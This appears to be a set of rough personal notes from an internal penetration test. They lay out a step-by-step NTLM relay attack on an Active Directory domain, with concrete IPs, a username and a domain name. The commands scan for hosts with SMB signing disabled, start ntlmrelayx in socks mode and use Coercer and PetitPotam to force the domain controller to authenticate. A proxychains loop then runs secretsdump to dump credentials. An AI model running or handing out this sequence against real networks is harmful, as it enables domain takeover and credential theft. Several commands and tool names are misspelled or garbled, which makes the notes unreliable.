



Relay over socks with ntlmrelayx. Hooks on auth and creates a socks instance to rpc.
Connect to process.

$DC is ntlm2 is to hard

![[Pasted image 20221206155102.png]]



nmap -vvv -p 636,389 -sV --version-light --open -oA nmap_ldap_search 10.20.*.*

Not smb signing enabled .nmap

cat smb_sign_10.20.254.0.nmap | grep -E "report for| message_signing: disabled" | grep "disabled" -B1 | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -uV

start ntlmrely
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -socks -smb2support -tf ~/relay_targets.ips.txt <<<list of smb disabled>

/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -socks -smb2support -tf ~/relay_targets.ips.txt



Py3 -m Pip install coecer

coecer

Check rpc apis available


find DCs
Dig


nmap -vvv -p 636,389 -sV --version-light --open 10.20.254.54/27



Coercer -v -u mmuller -d aev.lcl --dc-ip 10.20.250.153 -t 10.20.250.153 -l 10.20.250.13

we see its vuln to petitpotam with the rcp-api output

Blue is api

Use potatampetite

Clone exploit
https://github.com/topotam/PetitPotam.git

Use pipe of found apis


python3 PetitPotam.py -u mmuller -p 'your password' -d aev.lcl -dc-ip 10.20.250.153 10.20.254.70 10.20.250.153 -pipe lsarpcq

Dcip,our host, target(dc)



Netstat -tulpen

Ntlm>socks


Proxychains -no-pass because the relay


for i in $(cat relay-admin.ip.txt); do proxychains4 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py AEV/MATLKAEV1ADP002\$@$i -no-pass -outputfile secrets_$i.log; done

Secretdump aev/user@ip

,ust use ntlm relay id



